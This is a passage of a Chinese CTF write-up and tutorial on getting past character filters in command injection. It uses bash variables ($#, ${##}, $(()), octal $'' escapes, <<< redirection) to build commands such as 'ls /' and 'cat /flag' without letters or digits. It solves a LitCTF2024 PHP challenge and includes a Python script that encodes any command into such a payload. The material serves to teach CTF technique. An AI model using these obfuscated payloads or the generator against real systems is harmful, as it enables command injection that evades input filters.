<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( $((~$(($((~$(())))$((~$(()))))))) $((~$(($((~$(())))$((~$(()))))))) ))</span><br></pre></td></tr></table></figure>

<p>用空格分隔了一下，注意看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))))))  已经符合一个完整的格式，会得到1，那么两个1就会得到11，这就是为什么可以得到11的原因</span><br></pre></td></tr></table></figure>

<p>那么现在来和之前生成1的payload对比一下（同样用空格分隔）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( ~$(($((~$(()))) $((~$(()))))) ))</span><br></pre></td></tr></table></figure>

<p>这样并不能形成一个完整的可计算的格式，故只能类似之前那样有个<code>+</code>，所以这里的<code>+</code>号可以省略，而那个2不能。</p>
<p><strong>那么如果遇到过滤<code>+</code>号的题</strong>，2该如何构造呢，注意看：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223600280.png" alt="image-20240602223600280"></p>
<p>尝试一下构造<code>-3</code>，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1: $((~$(())))</span><br><span class="line"></span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))))))</span><br><span class="line">可以直接得到2，看了一下构造，应该是可以去掉+号的，尝试一下：</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))$((~$(()))))))) ,成功</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223942848.png" alt="image-20240602223942848"></p>
<p>多尝试，看构造，较重要</p>
<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>LitCTF2024 - 百万美元的诱惑</p>
<p>开题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好康的&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;干巴爹干巴爹先辈~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;开胃小菜))&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的绕过，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2&amp;c=2025a</span><br></pre></td></tr></table></figure>

<p>然后给了第二关<code>/dollar.php</code>，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>正好对应这个知识点，构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-13取反为12</span><br><span class="line"></span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>直接抓包后传进去即可</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240610184944008.png" alt="image-20240610184944008"></p>
<h3 id="利用shell脚本变量构造命令"><a href="#利用shell脚本变量构造命令" class="headerlink" title="利用shell脚本变量构造命令"></a>利用shell脚本变量构造命令</h3><p>这个思路最早提出于2017年34c3CTF里的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p>
<p><strong>探姬师傅有个项目应该是可以尝试一把梭的</strong>，好文好项目推送：<code>https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</code></p>
<p>还有bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></p>
<h4 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h4><p>这一板块去跟一下最早的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">文章</a>。</p>
<p><strong>这道题允许的字符串<code>$()#!&#123;&#125;&lt;\’,</code></strong></p>
<p>这里说明一下相关变量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）$# -参数数量-单独使用结果为0</span><br><span class="line">（2）$&#123;##&#125; -计数变量（#）长度，这里的结果为1</span><br><span class="line">（3）$((expr)) -算术表达式</span><br><span class="line">（4）&lt;&lt;&lt; -这是Bash shell语言中的重定向符，将一个变量或者字符串重定向到命令的标准输入（即wc -w &lt;&lt;&lt; &quot;H&quot;等价于echo &quot;H&quot; | wc -w）</span><br><span class="line">（5）$&#123;!var&#125; -间接引用</span><br><span class="line">（6）$&#x27;\123&#x27; -将八进制转换为字符串文字中的字符</span><br><span class="line">（7）&#123;a,b&#125; -花括号扩展</span><br></pre></td></tr></table></figure>

<p><strong>这里补充说明一下</strong>：</p>
<ul>
<li>对（5）的间接引用的说明，直接给shell测试代码：</li>
</ul>
<p>haha.sh:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">var1=&quot;hello&quot;</span><br><span class="line">var2=&quot;var1&quot;</span><br><span class="line">echo $&#123;!var2&#125;</span><br></pre></td></tr></table></figure>

<p>再运行：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603023300478.png" alt="image-20240603023300478"></p>
<p>可以看到这里输出的是hello，这就是间接引用的定义。</p>
<ul>
<li>对（6）的补充说明，如下：</li>
</ul>
<p>一个小小的前置知识，看完理解一下就行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls ==》 $&#x27;\154&#x27;$&#x27;\163&#x27; 这样是可以直接使用的</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603153444204.png" alt="image-20240603153444204"></p>
<p>就是<code>$&#39;&#39;</code>会直接执行生成，所以交给编译器的是ls，也就会执行。</p>
<p><strong>再进行组合运用一下：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;)) - 1左移1，结果为2 位运算，与二进制的运算相关</span><br><span class="line">$&#123;!#&#125; - 执行 bash（因为第一个参数是 /bin/bash），可以在本地输出看看</span><br><span class="line">$((2#100)) -将二进制转换为十进制</span><br></pre></td></tr></table></figure>



<h5 id="开始构造"><a href="#开始构造" class="headerlink" title="开始构造"></a>开始构造</h5><p>先尝试<code>ls</code>，**<code>l</code>对应八进制为0154，<code>s</code>对应的八进制为0163。**</p>
<p><strong>先用八进制表示，<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现<code>$&#39;\154\163&#39;</code>也可以表示<code>ls</code>，</strong>这里先跟文章，然后再尝试自己构造发现的同样表示ls的方法。</p>
<p>注意组合运用那里<code>$((2#100))</code>可以将二进制100转换为十进制数4，采用这个思路来构造出整数，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br></pre></td></tr></table></figure>

<p>那么现在就用<code>$#</code>（0）和<code>$</code>（1）来替换里面的数字，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 ：$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#</span><br><span class="line">163二进制数 ：$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;</span><br></pre></td></tr></table></figure>

<p>这样就可以构造出二进制的数。</p>
<p>那么此时就需要构造出前面的2，<strong>此时再看组合运用那里</strong>，<code>$(($&lt;&lt;$))</code>这样不就构造出2了吗，最终效果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">同理</span><br><span class="line">163：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br></pre></td></tr></table></figure>

<p>这时再套入<code>$&#39;&#39;</code>，即（<code>$&#39;\154&#39;$&#39;\163&#39;</code>），如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先看正常包裹：</span><br><span class="line">$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))&#x27;$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))&#x27;</span><br><span class="line">这样并不能成功，请注意。估计就是套外面的特殊符号被当作字符串从而转义了，这里就需要在特殊符号前面加一个\防止被转义。</span><br><span class="line">那么再次尝试如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">输出看看</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125450576.png" alt="image-20240603125450576"></p>
<p>但是注意，这个构造出来的<code>$&#39;\154&#39;$&#39;\163&#39;</code><strong>只会被当做字符串，并不会被当作命令执行再次执行从而形成ls</strong>，也就是说这里的<code>$&#39;&#39;</code>并没有起作用，本来它可以自己执行从而生成ls的，为什么不继续解析可以看看这个<a href="https://www.freebuf.com/articles/system/361101.html">文章</a>，可以在终端直接传，结果如下：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125825756.png" alt="image-20240603125825756"></p>
<p>显示没有这个命令，那么此时我们就需要将这个传入bash使得这个被解析为<code>ls</code>，<strong>这次就可以利用到<code>&lt;&lt;&lt;</code>这个重定向符</strong>，如下格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p>这样就可以成功构造出ls，再传入的时候就可以被执行，但是这道题这里要求无字母，此时就<strong>可以用到间接扩展<code>$0</code>，单独使用在linux中对应bash</strong>，但是这道题不能有数字，看组合运用那里，就可以像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;!#&#125; &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p>很怪的就是本地测试当中<code>bash&lt;&lt;&lt;.....</code>可以执行，但是<code>$0</code>和<code>$&#123;!#&#125;</code>都不能成功执行，报错如下：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603135658082.png" alt="image-20240603135658082"></p>
<p><strong>怪？？？，怎么回事，可能是宝塔linux环境的问题吧，多尝试，注意看题目要求。</strong></p>
<p>这里再用centos跑一下：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204933409.png" alt="image-20240603204933409"></p>
<p>成功，这样就可以构造出没有数字字母的<code>ls</code>的payload了。</p>
<p><strong>那么继续深入</strong>，比如读flag（<code>cat /flag</code>）或者查看根目录（<code>ls /</code>），<strong>尝试直接利用</strong>一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt; $&#x27;\154\163\40\57&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603141433189.png" alt="image-20240603141433189"></p>
<p>注意看，这里构造出来后被<code>ls /</code>被当作了整个字符串处理，而不是命令，这是怎么回事，<strong>这是因为<code>bash</code>是用空格分隔参数，这个方法（<code>$&#39;&#39;</code>）处理完的结果会导致整个结果都被当做了字符串（包括这里的空格）</strong>，这就导致了不能被正常解析为命令。解决方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要先给bash来参数分离一下，</span><br><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;   </span><br><span class="line">即可成功执行，还有问题的话就如这种格式尝试&#123;ls,/&#125;，注意&#123;ls,/&#125;也不能像之前ls那样直接利用，与ls /同样的问题。</span><br></pre></td></tr></table></figure>



<p><strong>再来看看文章的问题</strong></p>
<p>在传入时有效的做到了以下几点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls -l&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>却报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash: line 1: ls -l: command not found</span><br></pre></td></tr></table></figure>

<p>看到这里我测试了一下，如下传参是可以执行的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;ls /&quot;</span><br></pre></td></tr></table></figure>

<p>我就在想为什么要这样在里面套一对单引号，本来以为是多此一举，想了一下，可能是构造出来的payload在转化完后就是这样的，事实胜于雄辩，直接构造一下看看结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /  ：$&#x27;\154\163\40\57&#x27;  这次这样构造一下</span><br><span class="line">相对应的二进制数为：0b10011010，0b10100011，0b101000 和 0b111001</span><br><span class="line">分别为 $&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$# $&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125; $&#123;##&#125;$#$&#123;##&#125;$#$#$# $&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;</span><br><span class="line">再二进制转十进制，如下：</span><br><span class="line">2:   $(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))</span><br><span class="line">154: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">163: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br><span class="line">40:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))</span><br><span class="line">57:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))</span><br></pre></td></tr></table></figure>

<p>那么现在如下构造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先完成最前面提出的问题，试试$&#x27;\154\163&#x27;能不能使用，如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">结合前面的问题，如下测试：</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;  成功执行ls</span><br><span class="line"></span><br><span class="line">同时注意bash&lt;&lt;&lt;&quot;&#x27;ls&#x27;&quot; 也是可以执行的</span><br></pre></td></tr></table></figure>

<p>这里说明了<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现的<code>$&#39;\154\163&#39;</code>都是可用的，虽然本来就是一样的。</p>
<p>现在回到原先的问题，刚好证明了，这里使用更简单的构造，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603150736801.png" alt="image-20240603150736801"></p>
<p>这个事实就可以充分地说明在这个构造方法中最终利用的payload确实是如文章所说：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls /&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>现在结合事实再来想想</strong>，估计就是因为在上面说过的最后结果会被当做字符串，这里为了与shell命令区分开，所以是<code>bash&lt;&lt;&lt;&quot;&#39;ls /&#39;&quot;</code>，中间的单引号表示的就是这是一个字符串，注意思考，区分<code>bash&lt;&lt;&lt;&quot;ls /&quot;</code>这两者的不同</p>
<p><strong>那现在就继续跟文章</strong></p>
<p>而出现这个结果的原因应该还是字符串问题，<strong>这阻止了<code>bash</code>用空格分隔参数，</strong></p>
<p>我们只需使用上述方法运行<code>bash -c</code>，并将最终命令作为参数。这样，<strong>第二次 bash 调用就会进行参数分离</strong>。</p>
<p>为了在<code>bash</code>和之间放置空格字符<code>-c</code>，我们使用括号扩展：<code>&#123;bash,-c&#125;</code>。这会扩展为带有空格的字符串。</p>
<p>最终构造地paylaod：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&#123;bash，-c，ls -l&#125;</span><br></pre></td></tr></table></figure>

<p><strong>那么发散一下，也就是再调用一下bash嘛，那么我尝试再用一次<code>&lt;&lt;&lt;</code>呢</strong>，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br><span class="line">注意防止转义</span><br></pre></td></tr></table></figure>

<p>成功执行，<strong>同时注意主要还是用这个</strong></p>
<h4 id="其它的利用"><a href="#其它的利用" class="headerlink" title="其它的利用"></a>其它的利用</h4><p>其他的博主由此也提出了新的利用方法，参考<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-1">文章</a></p>
<h5 id="shell脚本中-的多种用法"><a href="#shell脚本中-的多种用法" class="headerlink" title="shell脚本中$的多种用法"></a>shell脚本中$的多种用法</h5><p>shell脚本中<code>$</code>的多种用法（例子可参考<a href="https://blog.csdn.net/ly_qiu/article/details/105765772">文章</a>）：</p>
<table>
<thead>
<tr>
<th>变量名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>$0</td>
<td>脚本本身的名字</td>
</tr>
<tr>
<td>$1</td>
<td>脚本后所输入的第一串字符</td>
</tr>
<tr>
<td>$2</td>
<td>传递给该shell脚本的第二个参数</td>
</tr>
<tr>
<td>$*</td>
<td>脚本后所输入的所有字符</td>
</tr>
<tr>
<td>$@</td>
<td>脚本后所输入的所有字符</td>
</tr>
<tr>
<td>$_</td>
<td>表示上一个命令的最后一个参数</td>
</tr>
<tr>
<td>$#</td>
<td>#脚本后所输入的字符串个数</td>
</tr>
<tr>
<td>$$</td>
<td>脚本运行的当前进程ID号</td>
</tr>
<tr>
<td>$!</td>
<td>表示最后执行的后台命令的PID</td>
</tr>
<tr>
<td>$?</td>
<td>显示最后命令的退出状态，0表示没有错误，其他表示有错误</td>
</tr>
</tbody></table>
<h5 id="利用-构造"><a href="#利用-构造" class="headerlink" title="利用$#构造"></a>利用<code>$#</code>构造</h5><p>本质就是和上面启程部分说的那个一样，但是有可能<code>$&#123;!#&#125;</code>这种复杂变量不能通过php的system函数解析出来，可以将其换一种形式：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165448778.png" alt="image-20240603165448778"></p>
<p>加了变量$__作为过渡，减少了解析的过程。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag</span><br><span class="line">__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p>可以使用的脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<h5 id="利用-构造-1"><a href="#利用-构造-1" class="headerlink" title="利用 $(()) 构造"></a>利用 $(()) 构造</h5><p>这个刚刚好上面记录到有这个吗，可以使用<code>$(())</code>来构造任意数字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0： $(())</span><br><span class="line">-1: $((~$(())))</span><br><span class="line">1:  $((~$((~$(($(())))$((~$(())))))))    </span><br><span class="line">2:  $(($((~$((~$(($(())))$((~$(())))))))&lt;&lt;$((~$((~$(($(())))$((~$(())))))))))     1&lt;&lt;1</span><br><span class="line">2：  $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>自己尝试按照<code>$#</code>那种方法来构造，比如ls</p>
